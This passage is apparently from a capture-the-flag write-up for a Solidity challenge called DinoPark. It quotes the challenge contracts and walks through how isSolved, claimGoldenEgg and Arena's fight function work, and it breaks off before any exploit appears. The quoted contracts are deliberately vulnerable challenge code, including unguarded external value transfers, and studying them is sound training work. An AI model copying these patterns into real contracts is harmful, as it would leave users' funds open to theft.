+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">50
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">51
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">52
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#859289;font-style:italic">// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span><span style="color:#e67e80">pragma solidity</span> <span style="color:#7a8478">^</span><span style="color:#d699b6">0</span>.<span style="color:#d699b6">8</span>.<span style="color:#d699b6">19</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">import</span> <span style="color:#b2c98f">&#34;./Arena.sol&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> DinoPark {
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">address</span> <span style="color:#e67e80">public</span> owner;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">address</span> <span style="color:#e67e80">public</span> goldenEggHolder;
+</span></span><span style="display:flex;"><span>    Arena <span style="color:#e67e80">public</span> arena;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">mapping</span>(<span style="color:#dbbc7f">address</span> <span style="color:#7a8478">=&gt;</span> <span style="color:#dbbc7f">uint256</span>) <span style="color:#e67e80">public</span> patronStake;
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">mapping</span>(<span style="color:#dbbc7f">uint256</span> <span style="color:#7a8478">=&gt;</span> <span style="color:#dbbc7f">string</span>) <span style="color:#e67e80">public</span> dinoNames;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">constant</span> NAMING_FEE <span style="color:#7a8478">=</span> <span style="color:#d699b6">0</span>.<span style="color:#d699b6">01</span> <span style="color:#e67e80">ether</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">constructor</span>() <span style="color:#e67e80">payable</span> {
+</span></span><span style="display:flex;"><span>        owner <span style="color:#7a8478">=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>;
+</span></span><span style="display:flex;"><span>        goldenEggHolder <span style="color:#7a8478">=</span> <span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">this</span>);
+</span></span><span style="display:flex;"><span>        arena <span style="color:#7a8478">=</span> <span style="color:#e67e80">new</span> Arena{<span style="color:#d699b6">value</span><span style="color:#7a8478">:</span> <span style="color:#d699b6">0</span>.<span style="color:#d699b6">5</span> <span style="color:#e67e80">ether</span>}(<span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">this</span>));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">announceMeteorShower</span>() <span style="color:#e67e80">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span> <span style="color:#7a8478">==</span> owner, <span style="color:#b2c98f">&#34;Only the owner can make announcements.&#34;</span>);
+</span></span><span style="display:flex;"><span>        arena.triggerMeteorShower();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">claimGoldenEgg</span>() <span style="color:#e67e80">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(arena.isChampion(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>), <span style="color:#b2c98f">&#34;DinoPark: Not a champion!&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(<span style="color:#dbbc7f">address</span>(arena).<span style="color:#d699b6">balance</span> <span style="color:#7a8478">&lt;=</span> <span style="color:#d699b6">1</span> <span style="color:#e67e80">wei</span>, <span style="color:#b2c98f">&#34;DinoPark: Arena still has funds!&#34;</span>);
+</span></span><span style="display:flex;"><span>        goldenEggHolder <span style="color:#7a8478">=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">stakeForPark</span>() <span style="color:#e67e80">external</span> <span style="color:#e67e80">payable</span> {
+</span></span><span style="display:flex;"><span>        patronStake[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">+=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">withdrawStake</span>() <span style="color:#e67e80">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> amount <span style="color:#7a8478">=</span> patronStake[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(amount <span style="color:#7a8478">&gt;</span> <span style="color:#d699b6">0</span>, <span style="color:#b2c98f">&#34;No stake to withdraw.&#34;</span>);
+</span></span><span style="display:flex;"><span>        patronStake[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">=</span> <span style="color:#d699b6">0</span>;
+</span></span><span style="display:flex;"><span>        (<span style="color:#dbbc7f">bool</span> sent, ) <span style="color:#7a8478">=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>.<span style="color:#d699b6">call</span>{<span style="color:#d699b6">value</span><span style="color:#7a8478">:</span> amount}(<span style="color:#b2c98f">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(sent, <span style="color:#b2c98f">&#34;Withdrawal failed.&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">setDinoName</span>(<span style="color:#dbbc7f">uint256</span> dinoId, <span style="color:#dbbc7f">string</span> calldata <span style="color:#d699b6">name</span>) <span style="color:#e67e80">external</span> <span style="color:#e67e80">payable</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span> <span style="color:#7a8478">==</span> NAMING_FEE, <span style="color:#b2c98f">&#34;Incorrect fee for naming service.&#34;</span>);
+</span></span><span style="display:flex;"><span>        dinoNames[dinoId] <span style="color:#7a8478">=</span> <span style="color:#d699b6">name</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">isSolved</span>() <span style="color:#e67e80">external</span> <span style="color:#e67e80">view</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">return</span> goldenEggHolder <span style="color:#7a8478">==</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>;   
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<p>The methods will using through the writeup is to start from <code>isSolve()</code> and list the steps I need to complete to solve.</p>
+<p>Just go <a href="#how-to-solve-in-a-nutshell">here</a> for the solve path.</p>
+<hr>
+<h1 id="reading-the-code">Reading the code</h1>
+<h2 id="dinopark">DinoPark</h2>
+<h3 id="issolved">isSolved</h3>
+<p>So as in many web3 CTF, the challenge is solve if the <code>isSolve</code> function which will be called by the infrastructure in backend.</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">isSolved</span>() <span style="color:#e67e80">external</span> <span style="color:#e67e80">view</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">return</span> goldenEggHolder <span style="color:#7a8478">==</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>;   
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Here the infra will call <code>isSolve()</code> to know if <code>goldenEggHolder</code> is the same address of msg.sender, the address calling <code>isSolved</code>, but we don&rsquo;t know with which address the infra call it, spoiler: it&rsquo;s our player address.</p>
+<h3 id="goldeneggholder">goldenEggHolder</h3>
+<p>To solve, <code>goldenEggHolder</code> is to be set to the address of <code>msg.sender</code> which his either directly our wallet (or EOA, externally owned address) or a contract.</p>
+<p><img src="https://blockchain-academy.hs-mittweida.de/wp-content/uploads/2021/09/msg_sender_tx_origin-scaled.jpg" alt="EOA address"></p>
+<ul>
+<li>spoiler (msg.sender need to be our EOA otherwise it won&rsquo;t solve)</li>
+</ul>
+<p>So we need to redefine <code>goldenEggHolder</code> at some point. Let&rsquo;s see where we can find this in the contract.</p>
+<p>By looking for the string in the contract we see that the default value of <code>goldenEggHolder</code> is  the address of the contract.</p>
+<h3 id="claimgoldenegg">claimGoldenEgg</h3>
+<p>And the way to set <code>goldenEggHolder</code> is to call <code>claimGoldenEgg</code>:</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">claimGoldenEgg</span>() <span style="color:#e67e80">external</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#d699b6">require</span>(arena.isChampion(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>), <span style="color:#b2c98f">&#34;DinoPark: Not a champion!&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#d699b6">require</span>(<span style="color:#dbbc7f">address</span>(arena).<span style="color:#d699b6">balance</span> <span style="color:#7a8478">&lt;=</span> <span style="color:#d699b6">1</span> <span style="color:#e67e80">wei</span>, <span style="color:#b2c98f">&#34;DinoPark: Arena still has funds!&#34;</span>);
+</span></span><span style="display:flex;"><span>    goldenEggHolder <span style="color:#7a8478">=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>which :</p>
+<ul>
+<li>call the <code>isChampion()</code> that checks if the value of <code>isChampion</code>  is msg.sender (our address).</li>
+<li>check that the balance of the arena is under 1 wei, so basically empty</li>
+<li>and check that we claimed the egg</li>
+</ul>
+<p>So we need to see on the arena how to become champion and find a way to empty the arena contract balance.</p>
+<h2 id="arena">Arena</h2>
+<h3 id="ischampion">isChampion</h3>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">isChampion</span>(<span style="color:#dbbc7f">address</span> _player) <span style="color:#e67e80">external</span> <span style="color:#e67e80">view</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#e67e80">return</span> champions[_player];
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It check inside a mapping (like a list) the value of <code>_player</code> passed in argument.
+<code>champions</code> map and address to a bool value :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#e67e80">mapping</span>(<span style="color:#dbbc7f">address</span> <span style="color:#7a8478">=&gt;</span> <span style="color:#dbbc7f">bool</span>) <span style="color:#e67e80">public</span> champions;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Value are written in this contract only at one place, inside the <code>fight()</code> function :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>        <span style="color:#e67e80">if</span> (playerWins) {
+</span></span><span style="display:flex;"><span>            champions[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">=</span> <span style="color:#e67e80">true</span>;
+</span></span><span style="display:flex;"><span>            (<span style="color:#dbbc7f">bool</span> sent, ) <span style="color:#7a8478">=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>.<span style="color:#d699b6">call</span>{<span style="color:#d699b6">value</span><span style="color:#7a8478">:</span> PRIZE_MONEY}(<span style="color:#b2c98f">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#d699b6">require</span>(sent, <span style="color:#b2c98f">&#34;Arena: Failed to send prize&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We need to win something so that the value is set to true.
+<br></p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">fight</span>(<span style="color:#dbbc7f">uint8</span> guess, FightMode mode) <span style="color:#e67e80">external</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">if</span> (<span style="color:#7a8478">!</span>isFighting[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>]) {
+</span></span><span style="display:flex;"><span>        prepareArena();
+</span></span><span style="display:flex;"><span>        isFighting[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">=</span> <span style="color:#e67e80">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">bool</span> playerWins <span style="color:#7a8478">=</span> _didPlayerWin(guess, mode);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">if</span> (playerWins) {
+</span></span><span style="display:flex;"><span>        champions[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">=</span> <span style="color:#e67e80">true</span>;
+</span></span><span style="display:flex;"><span>        (<span style="color:#dbbc7f">bool</span> sent, ) <span style="color:#7a8478">=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>.<span style="color:#d699b6">call</span>{<span style="color:#d699b6">value</span><span style="color:#7a8478">:</span> PRIZE_MONEY}(<span style="color:#b2c98f">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(sent, <span style="color:#b2c98f">&#34;Arena: Failed to send prize&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    isFighting[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">=</span> <span style="color:#e67e80">false</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Three things are done :</p>
+<ul>
+<li>Check if <code>isFighting</code> is False, run <code>prepareArena</code> if it is.</li>
+<li>call <code>_didPlayerWin</code> with the argument passed to <code>fight()</code></li>
+<li>If <code>_didPlayerWin</code> return a True value, we get champion</li>
+</ul>
+<p>Let&rsquo;s look at <code>prepareArena()</code> :</p>
+<h3 id="_didplayerwin">_didPlayerWin</h3>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
